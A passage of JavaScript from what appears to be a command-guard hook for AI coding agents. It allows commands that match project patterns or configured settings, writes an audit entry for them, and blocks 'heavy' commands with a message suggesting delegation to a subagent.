      const matched = matchedProjectCommandAllowPattern(command, cwd);
      if (matched) {
        let repoTop = '';
        try { repoTop = LIB['../companion/lib/identity.js'].resolveContext(cwd || process.cwd(), { missingPath: 'ancestor' }).toplevel || ''; } catch (e) { if (cmdFatal(e)) throw e; }
        appendProjectCommandAllowAudit({ cwd: cwd, repo: repoTop, pattern: matched, command: command });
        return true;
      }
    }
    return false;
  })) return 'allow';
  if (guarded(() => {
    if (settingsGet('guards', 'allowPlainPush') !== false) {
      if (isAllowedPlainPushChain(command, (payload && payload.cwd) || '', payload)) return true;
    }
    return false;
  })) return 'allow';
  if (guarded(() => settingsGet('guards', 'allowBackgroundScratchScripts') !== false && isBackgroundScratchScript(command, payload))) return 'allow';
  if (guarded(() => settingsGet('guards', 'allowGcloudReads') !== false && isAllowedGcloudReadCommand(command))) return 'allow';

  const cls = classifyHeavy(command);
  const remote = !!cls && cls.kind === 'remote';
  const detail = remote ? '' : cls
    ? (cls.kind === 'verb' ? text.render(ah.cfg('command.msg_heavy_detail_verb'), { label: cls.label }) : text.render(ah.cfg('command.msg_heavy_detail_category'), { label: cls.label }))
    : text.render(ah.cfg('command.msg_heavy_detail_category'), { label: ah.cfg('command.heavy_default_label') });
  const devswarmPrimary = guarded(() => LIB['./lib/devswarm-detect.js'].isDevswarmActive() && !LIB['./lib/devswarm-role.js'].isChildWorkspace()) || false;
  let cdJoinHint = '';
  guarded(() => {
    const m = RX138.exec(command);
    if (m && isBoundedVerificationCommand(m[1] + ' &&' + command.slice(m[0].length), { payload: payload })) cdJoinHint = ah.cfg('command.msg_heavy_cd_hint');
  });
  let tierText = false;
  guarded(() => { tierText = devswarmPrimary && LIB['./lib/primary-tier.js'].primaryTierTextOn(guardEnv, (payload && payload.cwd) || process.cwd()); });
  const H = LIB['./lib/host-text.js'];
  const codexHost = H.isCodex(payload);
  const heavyWhat = text.render(ah.cfg('command.msg_heavy_what'), { kind: ah.cfg(remote ? 'command.msg_heavy_remote' : 'command.msg_heavy_plain'), detail: detail });
  const SUB = codexHost ? H.CODEX_SUBAGENT : ah.cfg('command.claude_subagent');
  const delegateTo = text.render(ah.cfg('command.msg_heavy_delegate'), { to: codexHost ? H.CODEX_CHEAP : SUB });
  const allowedShapes = ah.cfg('command.msg_heavy_allowed') + ah.cfg(codexHost ? 'command.msg_heavy_allowed_codex' : 'command.msg_heavy_allowed_claude');
  const reason = bm.blockMessage({
    guard: ah.cfg('command.guard_name'),
    what: heavyWhat,
    why: ah.cfg('command.msg_heavy_why'),
    instead: (devswarmPrimary && tierText
      ? text.render(ah.cfg('command.msg_heavy_instead_tier'), { delegate: delegateTo, sub: SUB })
      : delegateTo + '.') + cdJoinHint,
    allowed: allowedShapes,
  });
  return blockExact(reason);
}

// the state of one call: the tables, the per-call state `S`, the hooks directory and a fresh heredoc scan
function cmdBegin(opts) {
  cmdTables();
  S = { unsure: false, off: false, light: [], pluginRoot: '' };
  S.pluginRoot = (opts && typeof opts.plugin_root === 'string' && opts.plugin_root) || ah.env.get(ah.cfg('env.plugin_root')) || '';
  __dirname = S.pluginRoot ? S.pluginRoot.replace(RX8, '') + '/hooks' : '';
  shellScan.reset();
}
// true when something only the Node hook can answer came up during the call
function cmdEnd() {
  var bad = S.unsure;
  S = null;
  return bad;
}

function decide(p, opts, event) {
  if (!p || typeof p !== 'object') return null;
  const ti = p.tool_input;
  if (!ti || typeof ti !== 'object' || typeof ti.command !== 'string') return null;
  cmdBegin(opts);
  let v;
  try { v = mainFlow(p); } catch (e) { if (!cmdFatal(e)) throw e; S.unsure = true; v = null; }
  return cmdEnd() || v === null ? 'defer' : v;
}
